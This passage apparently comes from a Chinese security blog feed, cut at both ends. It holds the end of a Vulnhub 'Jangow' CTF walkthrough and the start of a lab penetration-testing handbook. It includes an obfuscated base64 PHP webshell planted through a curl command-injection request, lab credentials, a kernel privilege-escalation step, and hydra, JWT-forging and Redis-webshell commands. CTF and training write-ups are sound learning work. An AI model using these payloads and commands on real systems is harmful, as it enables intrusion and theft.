class="line">PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3</span><br><span class="line">MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJM</span><br><span class="line">ZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwk</span><br><span class="line">a0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3Js</span><br><span class="line">ZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYk</span><br><span class="line">aTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNM</span><br><span class="line">cyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRr</span><br><span class="line">eyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdT</span><br><span class="line">eicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTsk</span><br><span class="line">TG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0n</span><br><span class="line">RVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRr</span><br><span class="line">KTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7</span><br><span class="line">CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo=</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/bfl.php&#x27;</span> --data <span class="string">&quot;BFL=system(&#x27;echo -n PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= | base64 -d &gt; BFL.php&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><code>weevely http://192.168.56.118/site/BFL.php Bufferfly</code></p><p>算是获取了个Shell吧</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p><code>cat user.txt</code></p><p><strong><code>d41d8cd98f00b204e9800998ecf8427e</code></strong></p><p><code>cat /var/www/html/.backup</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><p><code>cat /var/www/html/site/wordpress/config.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;desafio02&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>cat /etc/passwd | grep home</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">jangow01:x:1000:1000:desafio02,,,:&#x2F;home&#x2F;jangow01:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>netstat里面看见了SSH，但是连不上，估计是配iptables了</p><p>在Virtualbox中登录（偷看WP的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jangow01</span><br><span class="line">abygurl69</span><br></pre></td></tr></table></figure><p>逛一圈后没看见什么有价值的信息</p><p><code>uname -a</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux jangow01 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a></p></blockquote><p>文件保存到本地</p><p>编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure><p>weevely中上传并赋权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:file_upload ./exp /tmp/exp</span><br><span class="line">chmod +x /tmp/exp</span><br></pre></td></tr></table></figure><p>VirtualBox终端中jangow01用户运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/exp</span><br></pre></td></tr></table></figure><p><code>cat /root/proof.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">                       @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                          </span><br><span class="line">                       @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    &#x2F;&amp;@@@@@@@@@@                          </span><br><span class="line">                       @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((&#x2F;&#x2F;#&amp;@@@&amp;   .&amp;@@@@@                          </span><br><span class="line">                       @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   .&#x2F;@@*   &amp;@@                          </span><br><span class="line">                       @  @@@@@* (@@@@@@@@@#&#x2F;.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@, &#x2F;@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                    </span><br><span class="line">                       @  @&amp;  @@@@@@@@#.         @@@,@@@&#x2F;           %.  #,   %@&amp;                    </span><br><span class="line">                       @@@#  @@@@@@@@&#x2F;         .@@@@@@@@@@            *  .,    @@                   </span><br><span class="line">                       @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                   </span><br><span class="line">                       @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                  </span><br><span class="line">                      @@&#x2F;  *@@@@@@@&#x2F;           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                      @@   .@@@@@@@&#x2F;          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                      @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                       @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                       @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                       @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@&#x2F;   &amp;@                   </span><br><span class="line">                       @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                       @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                       @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&#x2F;     &amp;@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#&#x2F;.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                       @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                       @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                                     &amp;&amp;&amp;@@@@&amp;%       &amp;&#x2F;    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                       (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure><hr /><blockquote><p>网络问题</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br><span class="line">...</span><br><span class="line">Chain ufw-user-forward (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-input (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ftp</span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:http</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">LOG        all  --  anywhere             anywhere             limit: avg 3&#x2F;min burst 5 LOG level warning prefix &quot;[UFW LIMIT BLOCK] &quot;</span><br><span class="line">REJECT     all  --  anywhere             anywhere             reject-with icmp-port-unreachable</span><br><span class="line"></span><br><span class="line">Chain ufw-user-limit-accept (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     all  --  anywhere             anywhere            </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-forward (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-input (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-logging-output (0 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line"></span><br><span class="line">Chain ufw-user-output (1 references)</span><br><span class="line">target     prot opt source               destination         </span><br><span class="line">ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:https</span><br><span class="line">ACCEPT     udp  --  anywhere             anywhere             udp dpt:https</span><br></pre></td></tr></table></figure><p>配置iptable来Ban掉反弹Shell倒是第一次见，在这上面也确实浪费了一些时间</p><blockquote><p>有SSH不用非要用VirtualBox终端登录</p></blockquote><p>非常规，有点整活</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">localectl</span><br><span class="line">   System Locale: LANG&#x3D;pt_BR.UTF-8</span><br><span class="line">                  LANGUAGE&#x3D;pt_BR:pt:en</span><br><span class="line">                  LC_NUMERIC&#x3D;pt_BR</span><br><span class="line">                  LC_TIME&#x3D;pt_BR</span><br><span class="line">                  LC_MONETARY&#x3D;pt_BR</span><br><span class="line">                  LC_PAPER&#x3D;pt_BR</span><br><span class="line">                  LC_NAME&#x3D;pt_BR</span><br><span class="line">                  LC_ADDRESS&#x3D;pt_BR</span><br><span class="line">                  LC_TELEPHONE&#x3D;pt_BR</span><br><span class="line">                  LC_MEASUREMENT&#x3D;pt_BR</span><br><span class="line">                  LC_IDENTIFICATION&#x3D;pt_BR</span><br><span class="line">       VC Keymap: n&#x2F;a</span><br><span class="line">      X11 Layout: br</span><br><span class="line">       X11 Model: a4techKB21</span><br></pre></td></tr></table></figure><p>但是比上次的西语键盘好摁点</p><p>参考资料</p><blockquote><p><a href="https://resources.infosecinstitute.com/topic/jangow-1-0-1-ctf-walkthrough/">WP</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vulnhub年靶机数量&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Year&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;Num&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;…&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2018&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;65&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2019&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;117&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2020&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;223&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2021&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;108&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:center&quot;&gt;2022&lt;/td&gt;
&lt;td style=&quot;text-align:center&quot;&gt;1&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;难免对于一个时代的落幕感到惋惜&lt;/p&gt;
&lt;p&gt;但同时庆幸自己能够在最好的时间参与其中&lt;/p&gt;
&lt;p&gt;在学习的过程中享受这个过程&lt;/p&gt;
&lt;p&gt;Thank you, Vulnhub &amp;amp; every author.&lt;/p&gt;
&lt;p&gt;Thank you for what I learned and every wonderful challenge I enjoyed.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>靶机渗透手册</title>
    <link href="https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/"/>
    <id>https://yoloyolo.top/2023/02/08/Drone-Pentest-Handbook/</id>
    <published>2023-02-08T16:15:20.000Z</published>
    <updated>2023-03-02T16:53:29.923Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="靶机渗透手册"><a class="markdownIt-Anchor" href="#靶机渗透手册"></a> 靶机渗透手册</h1><p><code>2020/10/28 21:19:49</code></p><h2 id="情报收集"><a class="markdownIt-Anchor" href="#情报收集"></a> 情报收集</h2><h3 id="实际渗透"><a class="markdownIt-Anchor" href="#实际渗透"></a> 实际渗透</h3><ul><li><a href="https://www.freebuf.com/articles/database/195169.html">全流程信息收集方法总结</a></li><li><a href="https://www.freebuf.com/articles/web/204883.html">渗透测试信息收集心得分享</a></li></ul><h3 id="靶机渗透"><a class="markdownIt-Anchor" href="#靶机渗透"></a> 靶机渗透</h3><h4 id="查找ip"><a class="markdownIt-Anchor" href="#查找ip"></a> 查找IP</h4><ul><li>主办方给出(比赛)</li><li>netdiscover</li><li>路由器查看主机IP(需权限)</li><li>根据虚拟机IP分布，用浏览器逐个访问IP(仅限存在WEB服务，不推荐)</li><li><code>nmap -sn -T5 192.168.0.0/24 | grep -B2 -E &quot;(virtual|VMware)&quot;</code>(虚拟机的MAC地址)</li><li><code>arp-scan -l</code></li></ul><h4 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h4><p><code>nmap -p 1-65535 -sV -v -T5 -n 192.168.0.0</code></p><h4 id="web路径"><a class="markdownIt-Anchor" href="#web路径"></a> Web路径</h4><p><code>dirb http://192.168.0.0/ -w</code><br /><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php -u http://192.168.0.1/</code></p><h4 id="smb信息枚举"><a class="markdownIt-Anchor" href="#smb信息枚举"></a> SMB信息枚举</h4><p><code>enum4linux 192.168.0.0</code></p><h2 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析"></a> 漏洞分析</h2><ul><li>SSH弱口令</li><li>FTP匿名登入</li><li>SMB弱口令</li><li>NFS目录挂载</li><li>Web服务框架</li><li>Web爆破</li><li>LDAP</li><li>Redis未授权</li><li>其他漏洞</li><li>searchsploit</li></ul><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><h3 id="ssh弱口令"><a class="markdownIt-Anchor" href="#ssh弱口令"></a> SSH弱口令</h3><p><code>hydra -V -I -f -t 64 -L user -P pass ssh://192.168.0.0:22</code></p><h3 id="ftp匿名登入"><a class="markdownIt-Anchor" href="#ftp匿名登入"></a> FTP匿名登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.1</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><ul><li>获取敏感文件</li><li>FTP Banner</li></ul><h3 id="smb弱口令"><a class="markdownIt-Anchor" href="#smb弱口令"></a> SMB弱口令</h3><p><code>enum4limux 192.168.0.0</code><br /><code>hydra -L user -P pass -I -e n smb://192.168.0.0</code><br /><code>smbmap -H 192.168.0.0</code><br /><code>smbclient //192.168.0.0/dir -U username</code><br />使用<code>smbclient</code>登入时需要确保路径/用户名/口令都正确</p><h3 id="nfs目录挂载"><a class="markdownIt-Anchor" href="#nfs目录挂载"></a> NFS目录挂载</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim /etc/exports</span><br><span class="line">    /share1 *(sync,ro) 192.168.0.0(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.0.0</span><br><span class="line">    Export list for 192.168.0.0:</span><br><span class="line">    /home/peter *</span><br><span class="line">mkdir /mnt/share1</span><br><span class="line">mount -t nfs 192.168.0.0:/home/peter /mnt/share1</span><br><span class="line">cd /mnt/share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><h3 id="web框架"><a class="markdownIt-Anchor" href="#web框架"></a> Web框架</h3><ul><li>drupal : RCE(<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a>)</li><li>wordpress : wpscan – <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> | searchsploit<ul><li>wpscan --url <a href="http://192.168.0.0/">http://192.168.0.0/</a> -e ap --plugins-detection Aggressive</li><li>Appearance -&gt; Editor -&gt; 404.php: <code>/wp-content/twentyfourteen/404.php</code></li></ul></li><li>webmin : MSF(exploit/linux/http/webmin_packageup_rce)</li><li>robots.txt</li><li>struts2漏洞</li><li>flask SSTI</li></ul><h3 id="web爆破"><a class="markdownIt-Anchor" href="#web爆破"></a> Web爆破</h3><ul><li>Web页面内容生成字典 : <code>cewl http://192.168.31.39/websec -w pass</code></li><li>hydra-post-form : <code>hydra -I -l contact@hacknos.com -P FuzzDicts-master/passwordDict/top6000.txt -vV -f 192.168.31.39 http-post-form &quot;/websec/login:username=^USER^&amp;password=^PASS^:Wrong&quot;</code></li><li>JWT : <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0</span><br><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import jwt</span><br><span class="line">&gt;&gt;&gt; jwt.encode(&#123;&#39;username&#39;: &#39;admin&#39;&#125;, &#39;1Kun&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo&#39;</span><br></pre></td></tr></table></figure><ul><li>HTTP-Basic认证<ul><li>配合Burp的Intruder模块</li><li>字典生成脚本</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">raw = [ </span><br><span class="line">        <span class="string">&#x27;Recon&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Web&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Home&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Service&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Blog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;TroubleShoot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Recon Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Secure&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5ecure&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Secure@hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Security@hackNos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> raw:</span><br><span class="line">            <span class="built_in">print</span> base64.b64encode(j + <span class="string">&#x27;:&#x27;</span> + i)</span><br></pre></td></tr></table></figure><h3 id="ldap"><a class="markdownIt-Anchor" href="#ldap"></a> LDAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.0 -p 389 --script ldap-search --script-args &#39;ldap.username&#x3D;&quot;cn&#x3D;admin,dc&#x3D;admin,dc&#x3D;local&quot;,ldap.password&#x3D;password&#39;</span><br></pre></td></tr></table></figure><h3 id="redis未授权"><a class="markdownIt-Anchor" href="#redis未授权"></a> Redis未授权</h3><ul><li>php文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo(); 